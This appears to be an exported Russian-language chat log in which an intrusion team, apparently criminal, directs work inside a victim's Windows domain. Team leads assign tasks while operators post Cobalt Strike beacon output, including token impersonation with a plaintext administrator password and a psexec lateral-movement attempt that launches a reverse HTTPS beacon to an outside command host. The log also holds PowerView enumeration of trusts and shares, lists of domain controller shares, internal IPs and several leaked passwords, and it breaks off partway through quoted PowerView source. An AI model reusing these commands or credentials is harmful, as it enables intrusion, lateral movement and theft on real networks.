@@ -1,0 +1,1223 @@
+{
+  "messages": [
+    {
+      "_id": "Fdg2J2nZKejio9XmA",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "`Tropical756$`",
+      "ts": "2020-10-02T16:35:01.032Z",
+      "u": {
+        "_id": "hjejta5RxgeJ37xnE",
+        "username": "user4",
+        "name": "user4"
+      },
+      "_updatedAt": "2020-10-02T16:35:01.060Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "mjWBa2Comux8iHKGA",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "еще пароль `﻿TripTrap85*`",
+      "ts": "2020-10-02T16:34:13.941Z",
+      "u": {
+        "_id": "hjejta5RxgeJ37xnE",
+        "username": "user4",
+        "name": "user4"
+      },
+      "_updatedAt": "2020-10-02T16:34:13.975Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "MaFxKmoSEZnYqCrxx",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "```\n Remote Admin\n``` \nзнач он админчик))",
+      "ts": "2020-10-02T15:12:29.214Z",
+      "u": {
+        "_id": "Rmne8eAkiu37dhm5z",
+        "username": "tl2",
+        "name": "Team Lead 2"
+      },
+      "_updatedAt": "2020-10-02T15:12:29.257Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "EMdYLSgLiuTAvcjgc",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "AWS-VPDC01 10.5.20.30",
+      "ts": "2020-10-02T15:03:31.155Z",
+      "u": {
+        "_id": "hjejta5RxgeJ37xnE",
+        "username": "user4",
+        "name": "user4"
+      },
+      "_updatedAt": "2020-10-02T15:03:31.190Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "ZDLLYnCbjANhJ7gWa",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "```\nbeacon> rev2self\n[*] Tasked beacon to revert token\nbeacon> make_token .\\administrator Tabiam*987\n[*] Tasked beacon to create a token for .\\administrator\nbeacon> jump psexec_psh AWS-VDDC01 https\n[*] Tasked beacon to run windows/beacon_https/reverse_https (fixtom.com:443) on AWS-VDDC01 via Service Control Manager (PSH)\n[+] host called home, sent: 214325 bytes\n[+] Impersonated DATACENTER2\\Administrator\n[-] Could not open service control manager on AWS-VDDC01: 5\n[-] Could not connect to pipe (\\\\AWS-VDDC01\\pipe\\status_59f6): 1326\n```",
+      "ts": "2020-10-02T15:02:47.201Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-02T15:02:55.052Z",
+      "mentions": [],
+      "channels": [],
+      "editedAt": "2020-10-02T15:02:55.051Z",
+      "editedBy": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8"
+      },
+      "urls": []
+    },
+    {
+      "_id": "p3oBGj9CQ3pqoTHsi",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "это шары, пока только эти",
+      "ts": "2020-10-02T15:02:36.296Z",
+      "u": {
+        "_id": "hjejta5RxgeJ37xnE",
+        "username": "user4",
+        "name": "user4"
+      },
+      "_updatedAt": "2020-10-02T15:02:36.328Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "HuqWa5oBrmkQdDxkm",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "```\n\\\\AWS-VPDC02\\ADMIN$ \t- Remote Admin\n\\\\AWS-VPDC02\\C$ \t- Default share\n\\\\AWS-VPDC02\\IPC$ \t- Remote IPC\n\\\\AWS-VPDC02\\NETLOGON \t- Logon server share \n\\\\AWS-VPDC02\\SYSVOL \t- Logon server share \n\\\\HO-VPDC01\\ADMIN$ \t- Remote Admin\n\\\\HO-VPDC01\\C$ \t- Default share\n\\\\HO-VPDC01\\IPC$ \t- Remote IPC\n\\\\HO-VPDC01\\NETLOGON \t- Logon server share \n\\\\HO-VPDC01\\SYSVOL \t- Logon server share \n\\\\AWS-VDDC01\\ADMIN$ \t- Remote Admin\n\\\\AWS-VDDC01\\C$ \t- Default share\n\\\\AWS-VDDC01\\IPC$ \t- Remote IPC\n\\\\AWS-VDDC01\\NETLOGON \t- Logon server share \n\\\\AWS-VDDC01\\print$ \t- Printer Drivers\n\\\\AWS-VDDC01\\SYSVOL \t- Logon server share \n\\\\AWS-VPDC01\\ADMIN$ \t- Remote Admin\n\\\\AWS-VPDC01\\C$ \t- Default share\n\\\\AWS-VPDC01\\IPC$ \t- Remote IPC\n\\\\AWS-VPDC01\\NETLOGON \t- Logon server share \n\\\\AWS-VPDC01\\SYSVOL \t- Logon server share \n\\\\AWS-VPLODC01\\ADMIN$ \t- Remote Admin\n\\\\AWS-VPLODC01\\C$ \t- Default share\n\\\\AWS-VPLODC01\\IPC$ \t- Remote IPC\n\\\\AWS-VPLODC01\\NETLOGON \t- Logon server share \n\\\\AWS-VPLODC01\\SYSVOL \t- Logon server share \n\n```",
+      "ts": "2020-10-02T15:02:24.904Z",
+      "u": {
+        "_id": "hjejta5RxgeJ37xnE",
+        "username": "user4",
+        "name": "user4"
+      },
+      "_updatedAt": "2020-10-02T15:02:25.053Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "hH6Yv2rZiDb9FqmwM",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "```\n```",
+      "ts": "2020-10-02T15:02:18.159Z",
+      "u": {
+        "_id": "hjejta5RxgeJ37xnE",
+        "username": "user4",
+        "name": "user4"
+      },
+      "_updatedAt": "2020-10-02T15:02:18.185Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "vwQQeeega8HJzCtBt",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "аккуратно проверьте",
+      "ts": "2020-10-02T15:02:11.620Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-02T15:02:11.654Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "PG35J9HTs3hus7wT6",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "в сисволе нашел)",
+      "ts": "2020-10-02T15:01:32.197Z",
+      "u": {
+        "_id": "hjejta5RxgeJ37xnE",
+        "username": "user4",
+        "name": "user4"
+      },
+      "_updatedAt": "2020-10-02T15:01:32.240Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "NKsK9dMLwGvJ3p4Ar",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "опа, это у нас откуда?",
+      "ts": "2020-10-02T15:01:31.407Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-02T15:01:31.445Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "xjg2PqSpT8s57vvkY",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "совсем нет шар?",
+      "ts": "2020-10-02T15:01:20.306Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-02T15:01:20.338Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "fMjFXhcQg69RWx825",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "KLLOGIN=administrator KLPASSWD=Tabiam*987",
+      "ts": "2020-10-02T15:01:17.520Z",
+      "u": {
+        "_id": "hjejta5RxgeJ37xnE",
+        "username": "user4",
+        "name": "user4"
+      },
+      "_updatedAt": "2020-10-02T15:01:17.552Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "RNzna9x5GgAzfh9it",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "Шары не отыскивает, трастов нет, на пользователей удалённого рабочего стола скрипт пишется",
+      "ts": "2020-10-02T14:23:41.380Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-02T14:23:41.412Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "444PYCGGyebMfrX8c",
+      "rid": "b3waFmEkyep694hCq",
+      "ts": "2020-10-02T13:16:14.397Z",
+      "msg": "",
+      "file": {
+        "_id": "7RCr8B2xsrFsYQN7e",
+        "name": "PS_ad_users.txt",
+        "type": "text/plain"
+      },
+      "groupable": false,
+      "attachments": [
+        {
+          "ts": "1970-01-01T00:00:00.000Z",
+          "title": "PS_ad_users.txt",
+          "title_link": "/file-upload/7RCr8B2xsrFsYQN7e/PS_ad_users.txt",
+          "title_link_download": true,
+          "type": "file",
+          "description": "переснято"
+        }
+      ],
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-02T13:16:14.457Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "qNymQ8CknEgawuEN8",
+      "rid": "b3waFmEkyep694hCq",
+      "ts": "2020-10-02T13:16:12.518Z",
+      "msg": "",
+      "file": {
+        "_id": "hFZCqw7jgd79bojEE",
+        "name": "PS_ad_computers.txt",
+        "type": "text/plain"
+      },
+      "groupable": false,
+      "attachments": [
+        {
+          "ts": "1970-01-01T00:00:00.000Z",
+          "title": "PS_ad_computers.txt",
+          "title_link": "/file-upload/hFZCqw7jgd79bojEE/PS_ad_computers.txt",
+          "title_link_download": true,
+          "type": "file",
+          "description": "переснято"
+        }
+      ],
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-02T13:16:12.550Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "8zLCzRvHrMWpqfnHf",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "Трастов нет походу\n```\n\n[*] 10/02 14:15:37 - Executing PowerView Get-DomainTrust via PowerPick\n[*] Tasked beacon to run: Get-DomainTrust -Server 10.7.20.30 -Domain matches.com (unmanaged)\n[+] host called home, sent: 133715 bytes\n```",
+      "ts": "2020-10-02T11:18:44.436Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-02T11:18:44.505Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "D5AdqXokguZMjcfiT",
+      "rid": "b3waFmEkyep694hCq",
+      "ts": "2020-10-02T10:39:26.365Z",
+      "msg": "",
+      "file": {
+        "_id": "w5HTXN9tPwENoHnLD",
+        "name": "EA.txt",
+        "type": "text/plain"
+      },
+      "groupable": false,
+      "attachments": [
+        {
+          "ts": "1970-01-01T00:00:00.000Z",
+          "title": "EA.txt",
+          "title_link": "/file-upload/w5HTXN9tPwENoHnLD/EA.txt",
+          "title_link_download": true,
+          "type": "file"
+        }
+      ],
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-02T10:39:26.396Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "4DvTMXh4NW5Sgh78u",
+      "rid": "b3waFmEkyep694hCq",
+      "ts": "2020-10-02T10:39:01.080Z",
+      "msg": "",
+      "file": {
+        "_id": "xvJH8hXbJJpYqtZ6Q",
+        "name": "DA.txt",
+        "type": "text/plain"
+      },
+      "groupable": false,
+      "attachments": [
+        {
+          "ts": "1970-01-01T00:00:00.000Z",
+          "title": "DA.txt",
+          "title_link": "/file-upload/xvJH8hXbJJpYqtZ6Q/DA.txt",
+          "title_link_download": true,
+          "type": "file"
+        }
+      ],
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-02T10:39:01.116Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "GvwTrPJHRvkJi9pNr",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "ЕА могут быть админами в трастовых доменах, либо иметь админ права на некоторых пк",
+      "ts": "2020-10-02T09:06:55.022Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-02T09:06:55.058Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "jyvY756gXSSRTTXWk",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "чем полезны ЕА, кстати? сколько снимаем - ни разу не использовали",
+      "ts": "2020-10-02T09:06:09.581Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-02T09:06:09.607Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "oihc6gn7fiJAxXfXk",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "по моему вы трасты тогда не собрали, попробуйте собрать",
+      "ts": "2020-10-02T09:06:05.948Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-02T09:06:05.980Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "eEKatLbS5ctkboTG2",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "ДА, ЕА, еще бы remote desktop group, ну и сервисные аккаунты",
+      "ts": "2020-10-02T09:05:26.442Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-02T09:05:26.472Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "uFB2qMAB2EvoSfH3e",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "тогда да",
+      "ts": "2020-10-02T09:04:59.544Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-02T09:04:59.581Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "w3WaxGS8Z7JZ4Erv6",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "переснимем",
+      "ts": "2020-10-02T09:04:47.913Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-02T09:04:47.943Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "h8fZ6P76T458Jiy95",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "если переснимать не собираетесь, возвращаемся к первоначальной задаче",
+      "ts": "2020-10-02T09:04:26.784Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-02T09:04:26.827Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "3n6F69yTfuWgir3fQ",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "не понимаю зачем)",
+      "ts": "2020-10-02T09:04:15.825Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-02T09:04:15.862Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "znvJHdMkAZLkoz5Y9",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "у сервисного",
+      "ts": "2020-10-02T09:03:56.092Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-02T09:03:56.129Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "cpRWpgWdu7t9pmioP",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "это у ДА?",
+      "ts": "2020-10-02T09:03:48.791Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-02T09:03:48.825Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "kpAaM42mwYoYvwrPe",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "таких игнорировать?",
+      "ts": "2020-10-02T09:03:36.117Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-02T09:03:36.155Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "XRnTNj4CvG3DigWYX",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "```\nOU=OLD Disabled Users,OU=Disabled Accounts\n```",
+      "ts": "2020-10-02T09:03:30.570Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-02T09:03:30.617Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "eH6zLrPHwce3Hrvar",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "можно ничего не переснимать, просто актуальная информация особенно после таких новостей всегда хорошо",
+      "ts": "2020-10-02T09:02:56.085Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-02T09:02:56.121Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "vdERMYQ8urJaGWntm",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "После такого списки ДА могли измениться, как и списки ДК, часть сети могли закрыть",
+      "ts": "2020-10-02T09:02:17.776Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-02T09:02:17.811Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "CdYLcGnwSoRKYXFFi",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "```\nCN=Service Accounts\n```",
+      "ts": "2020-10-02T09:02:06.142Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-02T09:02:06.180Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "8P7JyHDuLq45Chu8Z",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "Тогда возможно сервисный акк",
+      "ts": "2020-10-02T09:01:53.016Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-02T09:01:53.044Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "ag9ogQ2vDPRLBbixz",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "-",
+      "ts": "2020-10-02T09:01:37.979Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-02T09:01:38.017Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "wbgXAe9NpnoLNvePC",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "[ ](https://mediaeveryone.com/group/matches?msg=oG8izZZgEp6uYmy5h) ДА был?",
+      "ts": "2020-10-02T09:00:35.747Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-02T09:00:35.782Z",
+      "attachments": [
+        {
+          "text": "```\n[-] 10.7.20.30:445        - Account lockout detected on 'Veeam', skipping this user.\n\n```",
+          "author_name": "user8",
+          "author_icon": "/avatar/user8",
+          "message_link": "https://mediaeveryone.com/group/matches?msg=oG8izZZgEp6uYmy5h",
+          "attachments": [],
+          "ts": "2020-09-30T09:55:56.655Z"
+        }
+      ],
+      "urls": [
+        {
+          "url": "https://mediaeveryone.com/group/matches?msg=oG8izZZgEp6uYmy5h",
+          "ignoreParse": true
+        }
+      ],
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "95o3JBi7FJs5xypCX",
+      "rid": "b3waFmEkyep694hCq",
+      "ts": "2020-10-02T09:00:18.117Z",
+      "msg": "",
+      "file": {
+        "_id": "NZYXLjtX4eLQsCs4e",
+        "name": "ad_users.txt",
+        "type": "text/plain"
+      },
+      "groupable": false,
+      "attachments": [
+        {
+          "ts": "1970-01-01T00:00:00.000Z",
+          "title": "ad_users.txt",
+          "title_link": "/file-upload/NZYXLjtX4eLQsCs4e/ad_users.txt",
+          "title_link_download": true,
+          "type": "file"
+        }
+      ],
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-02T09:00:18.188Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "bJA2mL4DYShGfQtQm",
+      "rid": "b3waFmEkyep694hCq",
+      "ts": "2020-10-02T09:00:07.412Z",
+      "msg": "",
+      "file": {
+        "_id": "ZheaAWYqSwaXCZhrq",
+        "name": "ad_computers.txt",
+        "type": "text/plain"
+      },
+      "groupable": false,
+      "attachments": [
+        {
+          "ts": "1970-01-01T00:00:00.000Z",
+          "title": "ad_computers.txt",
+          "title_link": "/file-upload/ZheaAWYqSwaXCZhrq/ad_computers.txt",
+          "title_link_download": true,
+          "type": "file"
+        }
+      ],
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-02T09:00:07.432Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "Tu4airMCCZHyAMRuo",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "перевытаскивать принципиально?",
+      "ts": "2020-10-02T09:00:00.364Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-02T09:00:00.409Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "vujR4zbsmnoFDL5x3",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "тогда вытащите списки пк, юзеров и в них по группам найти domain controller, domain admin",
+      "ts": "2020-10-02T08:57:32.861Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-02T08:57:32.900Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "TE4gZ4h4hSnio8qtb",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "я не понимаю немного зачем это делать на дедике",
+      "ts": "2020-10-02T08:56:53.212Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-02T08:56:53.239Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "FYA9ykNevaurpWDyB",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "```\nbeacon> shell net group \"domain admins\" /dom && net group \"enterprise admins\" /dom && net localgroup administrators\n[*] Tasked beacon to run: net group \"domain admins\" /dom && net group \"enterprise admins\" /dom && net localgroup administrators\n[+] host called home, sent: 132 bytes\n[+] received output:\nThe request will be processed at a domain controller for domain WORKGROUP.\n\nSystem error 1355 has occurred.\n\nThe specified domain either does not exist or could not be contacted.\n\n```",
+      "ts": "2020-10-02T08:56:12.325Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-02T08:56:12.417Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "nkrSm2hXTK5cDMvbW",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "```\n\nbeacon> net domain_controllers\n[*] Tasked beacon to run net domain_controllers\n[+] host called home, sent: 104518 bytes\n[+] received output:\nDomain Controllers:\n\n[-] Error: 0\n\nbeacon> net domain\n[*] Tasked beacon to run net domain\n[+] host called home, sent: 257 bytes\n```",
+      "ts": "2020-10-02T08:55:53.701Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-02T08:56:34.319Z",
+      "mentions": [],
+      "channels": [],
+      "editedAt": "2020-10-02T08:56:34.315Z",
+      "editedBy": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8"
+      },
+      "urls": []
+    },
+    {
+      "_id": "qYLTBKx6qrxdh9u6z",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "списки ДА, ЕА, ДК переснимите",
+      "ts": "2020-10-02T08:55:42.250Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-02T08:55:49.209Z",
+      "mentions": [],
+      "channels": [],
+      "editedAt": "2020-10-02T08:55:49.206Z",
+      "editedBy": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1"
+      },
+      "urls": []
+    },
+    {
+      "_id": "xeuQMNiLZvKnjkt7o",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "-",
+      "ts": "2020-10-02T08:55:22.380Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-02T08:55:22.414Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "td7CxNkNwSLoL6B6R",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "ping видит хост?",
+      "ts": "2020-10-02T08:54:51.611Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-02T08:54:51.652Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "WKaHBE8JWgMk5hnvE",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "я опять что-то не так сделал?",
+      "ts": "2020-10-02T08:54:13.836Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-02T08:54:13.879Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "Z7wuhnfwaKSwXixe6",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "```\nbeacon> net view \\\\HK-VPDC01 /all\n[*] Tasked beacon to run net view on \\\\HK-VPDC01 /all\n[+] host called home, sent: 104504 bytes\n[+] received output:\nList of hosts for domain '\\\\HK-VPDC01 /all':\n\n Server Name             IP Address                       Platform  Version  Type   Comment\n -----------             ----------                       --------  -------  ----   -------\n[-] Error: 87\n\nbeacon> net view \\\\AWS-VDDC01 /all\n[*] Tasked beacon to run net view on \\\\AWS-VDDC01 /all\n[+] host called home, sent: 104504 bytes\n[+] received output:\nList of hosts for domain '\\\\AWS-VDDC01 /all':\n\n Server Name             IP Address                       Platform  Version  Type   Comment\n -----------             ----------                       --------  -------  ----   -------\n[-] Error: 87\n```",
+      "ts": "2020-10-02T08:53:57.437Z",
+      "u": {
+        "_id": "aLgWcQx7CGaqXfqkN",
+        "username": "user8",
+        "name": "wevvewe"
+      },
+      "_updatedAt": "2020-10-02T08:53:57.551Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "i2Dw5cPtDveaHTJX7",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "```\n.PARAMETER Domain\n        Domain to query for machines.\n```",
+      "ts": "2020-10-02T08:50:14.542Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-02T08:50:14.601Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "T7jDpbdMuthC8NfRj",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "`Invoke-ShareFinder -HostList hosts.txt`",
+      "ts": "2020-10-02T08:50:03.152Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-02T08:50:03.189Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "PeQyfgsiSbDFH6hZk",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "если читать исходиники",
+      "ts": "2020-10-02T08:49:42.826Z",
+      "u": {
+        "_id": "yJcaRFnKQqepiffHq",
+        "username": "tl1",
+        "name": "Team Lead 1"
+      },
+      "_updatedAt": "2020-10-02T08:49:42.869Z",
+      "mentions": [],
+      "channels": []
+    },
+    {
+      "_id": "xKwcCXbx4sw9EHh9Y",
+      "rid": "b3waFmEkyep694hCq",
+      "msg": "```\nfunction Invoke-ShareFinder {\n    <#\n        .SYNOPSIS\n        Finds (non-standard) shares on machines in the domain.\n        Author: @harmj0y\n        \n        .DESCRIPTION\n        This function finds the local domain name for a host using Get-NetDomain,\n        queries the domain for all active machines with Get-NetComputers, then for \n        each server it lists of active shares with Get-NetShare. Non-standard shares \n        can be filtered out with -Exclude* flags.\n        .PARAMETER HostList\n        List of hostnames/IPs to search.\n        .PARAMETER ExcludeStandard\n        Exclude standard shares from display (C$, IPC$, print$ etc.)\n        .PARAMETER ExcludePrint\n        Exclude the print$ share\n        .PARAMETER ExcludeIPC\n        Exclude the IPC$ share\n        .PARAMETER CheckShareAccess\n        Only display found shares that the local user has access to.\n        .PARAMETER CheckAdmin\n        Only display ADMIN$ shares the local user has access to.\n        .PARAMETER Ping\n        